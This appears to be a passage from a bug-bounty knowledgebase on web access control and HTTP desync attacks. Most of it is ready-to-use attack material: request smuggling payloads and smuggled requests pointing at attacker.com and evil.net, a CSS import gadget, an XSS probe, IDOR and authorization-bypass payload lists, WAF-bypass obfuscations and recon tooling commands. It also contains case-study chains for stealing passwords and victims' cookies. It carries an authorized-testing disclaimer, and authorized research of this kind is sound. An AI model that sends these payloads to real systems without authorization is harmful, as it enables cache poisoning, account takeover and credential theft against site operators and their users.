# HEAD response contains headers only
# Combine with reflected query parameter for XSS
HEAD /404/?cb=123 HTTP/1.1
Host: target.com

# Next request's response body is spliced with previous headers
GET /x?<script>alert(1)</script> HTTP/1.1
```

### JavaScript Resource Poisoning

```http
# Poison JavaScript import
POST /static/js/app.js HTTP/1.1
Host: target.com
Content-Length: 57
Transfer-Encoding: chunked

0

GET / HTTP/1.1
Host: attacker.com
X: X
```

### CSS Import Gadget

```http
# Poison CSS import rule
GET /style.css?x=a);@import url(http://attacker.com/malicious.css) HTTP/1.1
```

### Open Redirect + DOM XSS Chain

```http
# Server-side redirect to DOM-based open redirect
POST /css/style.css HTTP/1.1
Host: target.com
Content-Length: 122
Transfer-Encoding: chunked

0

POST /search?dest=../assets/idx?redir=//target.com@evil.net/ HTTP/1.1
Host: target.com
Content-Length: 15

x=GET /en/solutions HTTP/1.1
```

---

## Real World Case Studies

### PayPal Login Page Compromise (Request Smuggling + Cache Poisoning)

**Chain:**
1. Request smuggling to poison JavaScript file: `fb-all-prod.pp2.min.js`
2. CSP on login page blocked direct script execution
3. Dynamically generated iframe loaded sub-page without CSP
4. Sub-page imported poisoned JS
5. Controlled iframe, redirected to `paypal.com/us/gifts` (no CSP)
6. Gained parent page access via Same Origin Policy bypass
7. Stole plaintext passwords from Safari/IE users

### New Relic Internal API Access (Request Smuggling)

**Chain:**
1. Smuggled request to internal API endpoint
2. Reflected POST parameter leaked internal headers
3. Discovered `Service-Gateway-Account-Id` and `Service-Gateway-Is-Newrelic-Admin`
4. Gained full admin-level access to internal API

### Mozilla SHIELD System Compromise (Cache Poisoning)

**Chain:**
1. `X-Forwarded-Host` header poisoned cache
2. Firefox SHIELD system fetched "recipes" from attacker domain
3. All Firefox users could be directed to attacker-controlled URLs
4. Potential for mass extension installation or DDoS

### Cloudflare 24M Website Takeover (HTTP/1.1 Desync)

**Chain:**
1. H2.0 desync on Heroku behind Cloudflare
2. Cloudflare's internal HTTP/1.1 desync
3. Cache poisoning of JavaScript files
4. Redirect random third-party site visitors to attacker domain
5. Affected 24,000,000+ websites

### Trello Profile Storage (Request Smuggling)

**Chain:**
1. Smuggled PUT request to profile update endpoint
2. Victim's complete request (including cookies/headers) saved to attacker profile
3. Attacker viewed profile to harvest victim credentials

### GitHub Fat GET Cache Poisoning

**Chain:**
1. Varnish + Rails allowed GET requests with body
2. Body parameters not included in cache key
3. Poisoned cache to change arbitrary parameters
4. Examples: change abuse report target, modify issue filters, disable raw button

### Zendesk Login CSRF (Fat GET)

**Chain:**
1. Fat GET to `/en-us/signin`
2. Poisoned `return_to` parameter
3. Victims logging in were redirected through attacker-controlled flow
4. Left victims logged into attacker's account

---

## Fuzzing Payloads

### ID Fuzzing Patterns

```
# Numeric sequences
1-1000
1000-9999
100000-999999

# Common IDs
user_id, id, uid, uuid, guid, pid, sid, cid, oid, rid, tid
account_id, customer_id, order_id, transaction_id, payment_id
file_id, document_id, message_id, thread_id, post_id

# Hash patterns (MD5, SHA1, SHA256)
^[a-f0-9]{32}$
^[a-f0-9]{40}$
^[a-f0-9]{64}$

# UUID patterns
^[0-9a-f]{8}-[0-9a-f]{4}-[0-9a-f]{4}-[0-9a-f]{4}-[0-9a-f]{12}$

# MongoDB ObjectId
^[0-9a-f]{24}$

# Timestamp-based
^\d{10}$  # Unix timestamp
^\d{13}$  # Millisecond timestamp
```

### Parameter Name Fuzzing

```
# ID-related
id, user_id, uid, uuid, account_id, customer_id, client_id
order_id, product_id, item_id, file_id, doc_id, message_id
thread_id, post_id, comment_id, review_id, payment_id
invoice_id, transaction_id, session_id, token_id, key_id

# Role-related
role, is_admin, admin, isAdmin, is_administrator, administrator
is_superuser, superuser, is_staff, staff, is_moderator, moderator
is_premium, premium, is_pro, pro, is_vip, vip, access_level
permission, permissions, acl, rights, privileges

# State-related
step, stage, state, status, action, confirmed, verified
approved, published, active, enabled, disabled, deleted
```

### Path Fuzzing

```
# Admin paths
admin, administrator, admin-panel, admin.php, admin.aspx
admin.html, admin.cgi, admin.pl, admin.py, admin.rb
manage, management, manager, manage.py, manager.html
console, backend, controlpanel, cpanel, moderator
superuser, root, system, sysadmin, webadmin, siteadmin

# API paths
api, api/v1, api/v2, api/v3, api/internal, api/private
api/public, api/admin, api/docs, api/swagger, api/graphql
rest, rest-api, graphql, graphiql, playground, swagger-ui

# Internal paths
internal, private, hidden, secret, secure, restricted
confidential, sensitive, backup, old, archive, temp
```

---

## Automation Workflows

### Recon Automation

```bash
# Subdomain enumeration
subfinder -d target.com -o subs.txt

# HTTP probing
httpx -l subs.txt -o alive.txt

# Crawling
katana -list alive.txt -o endpoints.txt

# Parameter discovery
cariddi -list alive.txt

# Nuclei scanning
nuclei -l alive.txt -t http/vulnerabilities/idor/
```

### IDOR Automation

```bash
# Autorize (Burp extension) — automatic authorization testing
# 1. Configure Autorize with low-privilege session
# 2. Browse application as high-privilege user
# 3. Autorize replays requests with low-privilege session
# 4. Flags potential authorization bypasses

# Authz (Burp extension) — compare responses
# 1. Configure Authz with different user sessions
# 2. Compare responses for same endpoints

# AuthMatrix (Burp extension) — role-based testing
```

### Request Smuggling Automation

```bash
# HTTP Request Smuggler (Burp extension)
# Right-click request → "Launch smuggle probe"

# Smuggler (Python)
git clone https://github.com/defparam/smuggler.git
cd smuggler
python3 smuggler.py -u https://target.com/

# Turbo Intruder (Burp extension)
# For high-speed race conditions and smuggling
```

### Cache Poisoning Automation

```bash
# Param Miner (Burp extension)
# Right-click request → "Guess headers" / "Guess cookies"
# Detects unkeyed inputs for cache poisoning

# Manual cache oracle testing:
# 1. Find cacheable endpoint with reflection
# 2. Add cache-buster parameter
# 3. Test header impact on response
# 4. Verify cache hit/miss behavior
```

---

## Recon Methodology

### Phase 1: Scope Enumeration

```
1. Subdomain enumeration (subfinder, amass)
2. Port scanning (naabu, nmap)
3. HTTP service discovery (httpx)
4. Technology fingerprinting (wappalyzer, httpx -tech-detect)
5. CDN/WAF detection (cdncheck, wafw00f)
```

### Phase 2: Endpoint Discovery

```
1. Web crawling (katana, gospider, hakrawler)
2. JavaScript analysis (linkfinder, JS enumeration)
3. API endpoint discovery (from JS, OpenAPI specs)
4. Parameter discovery (Param Miner, Arjun)
5. Hidden parameter mining (wordlists + brute force)
```

### Phase 3: Access Control Mapping

```
1. Identify user roles (guest, user, admin, superadmin)
2. Map endpoints to roles
3. Test for missing authorization checks
4. Test for IDOR in all object references
5. Test for horizontal/vertical escalation paths
```

### Phase 4: Advanced Testing

```
1. Request smuggling detection (HTTP Request Smuggler)
2. Cache poisoning detection (Param Miner)
3. Race condition testing (Turbo Intruder)
4. Business logic abuse testing
5. OAuth/OpenID Connect testing
```

### Phase 5: Chaining & Exploitation

```
1. Identify chainable vulnerabilities
2. Build exploitation chains
3. Maximize impact (account takeover, data exfiltration)
4. Document reproduction steps
5. Prepare report with clear impact demonstration
```

---

## Nuclei Templates

### IDOR Detection Templates

```yaml
# Generic IDOR detection
id: generic-idor
info:
  name: Generic IDOR Detection
  author: community
  severity: high

http:
  - method: GET
    path:
      - "{{BaseURL}}/api/users/{{id}}"
    payloads:
      id:
        - "1"
        - "2"
        - "3"
    matchers:
      - type: word
        words:
          - "email"
          - "username"
          - "phone"
```

### Broken Access Control Templates

```yaml
# Admin panel exposure
id: exposed-admin-panel
info:
  name: Exposed Admin Panel
  author: community
  severity: medium

http:
  - method: GET
    path:
      - "{{BaseURL}}/admin"
      - "{{BaseURL}}/administrator"
      - "{{BaseURL}}/admin-panel"
    matchers:
      - type: word
        words:
          - "admin"
          - "dashboard"
          - "login"
        condition: and
```

### Template Sources

- `github.com/projectdiscovery/nuclei-templates/tree/main/http/vulnerabilities/idor`
- Custom templates for target-specific endpoints
- Community templates for common patterns

---

## Tools and Scanners

### Burp Suite Extensions

| Extension | Purpose |
|-----------|---------|
| **Autorize** | Automatic authorization testing |
| **Authz** | Response comparison for authorization |
| **AuthMatrix** | Role-based authorization testing |
| **HTTP Request Smuggler** | Request smuggling detection |
| **Param Miner** | Hidden parameter/cache poisoning detection |
| **Turbo Intruder** | High-speed race conditions and fuzzing |
| **Backslash Powered Scanner** | Advanced diffing logic |
| **DOM Invader** | Client-side vulnerability detection |

### Standalone Tools

| Tool | Purpose |
|------|---------|
| **Nuclei** | Vulnerability scanner with templates |
| **Subfinder** | Subdomain enumeration |
| **Httpx** | Fast HTTP prober |
| **Katana** | Web crawler |
| **Naabu** | Port scanner |
| **Cariddi** | Endpoint extraction and scanning |
| **Smuggler** | HTTP request smuggling testing |
| **Arjun** | HTTP parameter discovery |
| **Wafw00f** | WAF detection |

### Wordlists

| Wordlist | Source | Purpose |
|----------|--------|---------|
| `raft-*` | SecLists | Directory/file brute-forcing |
| `combined_directories.txt` | SecLists | Auto-updated combined list |
| `reverse-proxy-inconsistencies.txt` | SecLists | Backend admin interfaces |
| `big.txt` | SecLists | Large directory wordlist |
| `common.txt` | SecLists | Common paths |

---

## Advanced Research

### HTTP/1.1 Must Die (2025)

> "HTTP/1.1 has a fatal, highly-exploitable flaw — the boundaries between individual HTTP requests are very weak."

**Key findings:**
- Parser discrepancy detection via header obfuscation
- V-H (Visible-Hidden) and H-V (Hidden-Visible) discrepancies
- 0.CL desync attacks via early-response gadgets
- Expect-based desync attacks
- Mass compromise of core infrastructure (Akamai, Cloudflare, Netlify)

**Five lies about HTTP/1.1:**
1. An HTTP/1.1 request can't directly target an intermediary
2. An HTTP/1.1 desync can only be caused by a parser discrepancy
3. An HTTP/1.1 response contains everything a proxy needs to parse it
4. An HTTP/1.1 response can only contain one header block
5. A complete HTTP/1.1 response requires a complete request

### Browser-Powered Desync Attacks (2022)

**Client-Side Desync (CSD) methodology:**
1. **Detect** — Find CSD vector (server ignores Content-Length)
2. **Confirm** — Replicate in real browser with fetch()
3. **Explore** — Find gadgets (Store, Chain/Pivot, Attack)
4. **Exploit** — Build reliable exploit

**Key techniques:**
- Stacked HEAD for response splicing
- Host-header redirect gadgets
- Client-side cache poisoning
- Fragmented chunk consumption
- Race condition engineering

### Web Cache Entanglement (2020)

**Cache key transformation attacks:**
- Port removal from cache key
- Query string exclusion
- Parameter cloaking
- Cache key injection
- Fat GET requests

**Methodology:**
1. Select cache oracle
2. Probe key handling
3. Find gadget
4. Exploit

### Hidden OAuth Attack Vectors (2021)

**Three novel vulnerabilities:**
1. **Dynamic Client Registration SSRF** — via `logo_uri`, `jwks_uri`, `sector_identifier_uri`
2. **Redirect URI Session Poisoning** — race condition in OAuth flow
3. **WebFinger User Enumeration** — `/.well-known/webfinger` endpoint

---

## Bug Bounty Writeups

### Notable Findings

| Researcher | Target | Technique | Bounty |
|------------|--------|-----------|--------|
| James Kettle | PayPal | Request Smuggling + Cache Poisoning | Significant |
| James Kettle | New Relic | Request Smuggling → Internal API | Significant |
| James Kettle | Mozilla | Cache Poisoning → SHIELD System | $1,000 |
| James Kettle | Cloudflare | HTTP/1.1 Desync | $7,000 |
| James Kettle | GitHub | Fat GET Cache Poisoning | $10,000 |
| James Kettle | Multiple | HTTP/1.1 Must Die (2 weeks) | $200,000+ |
| Community | HackerOne | IDOR in various programs | Varies |
| Community | Airbnb | Web to App Notification IDOR | Significant |

### Key Lessons from Writeups

1. **Chain vulnerabilities** — Single bugs often pay less; chains pay more
2. **Maximize impact** — Show full account takeover or mass exploitation
3. **Document clearly** — Step-by-step reproduction with screenshots
4. **Be patient** — Some targets take months to patch
5. **Use staging** — Test on staging environments when possible
6. **Avoid collateral damage** — Use cache-busters, test during off-hours

---

## Payload Collections

### IDOR Payload List

```
# Numeric IDs
1, 2, 3, ..., 100
1000, 1001, 1002
1337, 31337, 666
-1, 0, 999999

# Common test accounts
1, 2, 3 (first users are often admins)

# GUIDs (for testing parser behavior)
00000000-0000-0000-0000-000000000000
11111111-1111-1111-1111-111111111111

# Special values
null, undefined, true, false
me, self, current, profile
all, *, %, _, .

# Path traversal
../, ..%2f, ..%252f, ..%c0%af
..\\, %2e%2e%2f, %252e%252e%252f
```

### Authorization Bypass Payloads

```
# Role values
admin, administrator, root, superuser, super_admin
moderator, editor, author, contributor, subscriber
user, guest, public, anonymous, test, demo
1, 0, true, false, yes, no, on, off

# Header injection
X-Role: admin
X-User-Role: administrator
X-Admin: true
X-Is-Admin: 1
X-Access-Level: 9
X-Permission: *
X-Group: administrators
```

### Request Smuggling Payloads

```
# CL.TE
Content-Length: 4
Transfer-Encoding: chunked

12
GPOST / HTTP/1.1

0

# TE.CL
Content-Length: 6
Transfer-Encoding: chunked

0

GPOST / HTTP/1.1

# CL.0
Content-Length: 23

GET /404 HTTP/1.1
X: Y

# H2.TE
# HTTP/2 request with Transfer-Encoding header
# (injected during HTTP/2 → HTTP/1.1 downgrade)
```

---

## WAF Bypasses

### Header Obfuscation

```http
# Space before header name
 Host: attacker.com

# Tab instead of space
Transfer-Encoding:\tchunked

# Multiple colons
Transfer-Encoding:: chunked

# Line folding
Transfer-Encoding:\n chunked

# Charset trick
Content-Type: application/x-www-form-urlencoded; charset=null, boundary=x
```

### Path Obfuscation

```http
# Double encoding
GET /%2561dmin HTTP/1.1

# Unicode
GET /admin%c0%afdelete HTTP/1.1

# Path parameters
GET /admin;param=value/deleteUser HTTP/1.1

# Matrix parameters
GET /admin;jsessionid=abc/deleteUser HTTP/1.1
```

### Method Obfuscation

```http
# Non-standard methods
POSTX /admin/deleteUser
GETX /admin/deleteUser

# Method override via header
X-HTTP-Method-Override: DELETE
X-Method-Override: PUT

# Method override via parameter
POST /admin/deleteUser?_method=DELETE
```

---

## Detection Techniques

### Manual Detection

1. **Identify object references** — Look for IDs in URLs, parameters, headers
2. **Test boundaries** — Increment/decrement IDs, test negative values
3. **Test access controls** — Try accessing resources with different sessions
4. **Test methods** — Try PUT/DELETE/PATCH where only GET is expected
5. **Test content types** — Switch between JSON/XML/form-data
6. **Test headers** — Add authorization-related headers

### Automated Detection

```bash
# Nuclei IDOR templates
nuclei -u target.com -t http/vulnerabilities/idor/

# Burp Autorize
# Configure with low-privilege session, browse as high-privilege

# Param Miner
# Right-click → Guess headers/params for cache poisoning vectors

# HTTP Request Smuggler
# Right-click → Launch smuggle probe
```

### Confirmation Techniques

1. **Response comparison** — Compare responses for different IDs
2. **Content length** — Check for unexpected content length changes
3. **Status codes** — Look for 200 OK on unauthorized resources
4. **Error messages** — Verbose errors may reveal unauthorized data
5. **Timing** — Timing differences may indicate authorization checks

---

## References

### Primary Sources

| Resource | URL |
|----------|-----|
| PortSwigger Access Control | https://portswigger.net/web-security/access-control |
| PortSwigger IDOR | https://portswigger.net/web-security/access-control/idor |
| OWASP Broken Access Control | https://owasp.org/www-community/Broken_Access_Control |
| OWASP API1:2023 BOLA | https://owasp.org/API-Security/editions/2023/en/0xa1-broken-object-level-authorization/ |
| HackTricks IDOR | https://book.hacktricks.wiki/en/pentesting-web/idor.html |
| PayloadsAllTheThings IDOR | https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/Insecure%20Direct%20Object%20References |
| PayloadsAllTheThings Business Logic | https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/Business%20Logic%20Errors |

### Research Papers

| Paper | Author | Year |
|-------|--------|------|
| HTTP Desync Attacks: Request Smuggling Reborn | James Kettle | 2019 |
| Practical Web Cache Poisoning | James Kettle | 2018 |
| Web Cache Entanglement | James Kettle | 2020 |
| Browser-Powered Desync Attacks | James Kettle | 2022 |
| HTTP/1.1 Must Die | James Kettle | 2025 |
| Hidden OAuth Attack Vectors | PortSwigger Research | 2021 |

### Tools

| Tool | URL |
|------|-----|
| Nuclei | https://github.com/projectdiscovery/nuclei |
| HTTP Request Smuggler | https://github.com/PortSwigger/http-request-smuggler |
| Param Miner | https://github.com/PortSwigger/param-miner |
| Smuggler | https://github.com/defparam/smuggler |
| SecLists | https://github.com/danielmiessler/SecLists |
| Subfinder | https://github.com/projectdiscovery/subfinder |
| Httpx | https://github.com/projectdiscovery/httpx |
| Katana | https://github.com/projectdiscovery/katana |

### Labs

| Lab | URL |
|-----|-----|
| PortSwigger Web Security Academy | https://portswigger.net/web-security |
| Web Security Academy - Access Control | https://portswigger.net/web-security/access-control |
| Web Security Academy - IDOR | https://portswigger.net/web-security/access-control/idor |

---

> **Disclaimer:** This knowledgebase is for authorized security testing and bug bounty hunting only. Always obtain proper authorization before testing any system. The techniques described here should only be used on systems you own or have explicit permission to test.

> **License:** Research and educational use. Respect responsible disclosure practices.

---

*Generated: 2026-05-24 | Compiled from PortSwigger Research, OWASP, HackTricks, PayloadsAllTheThings, Nuclei Templates, ProjectDiscovery, James Kettle Research, SecLists, and Community Research.*
